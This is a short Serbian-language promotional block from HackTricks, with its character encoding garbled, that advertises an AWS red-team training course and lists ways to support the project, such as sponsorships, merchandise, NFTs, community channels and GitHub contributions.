<summary><strong>NauÄite hakovanje AWS-a od poÄetnika do struÄnjaka sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks suvenir**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi** ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
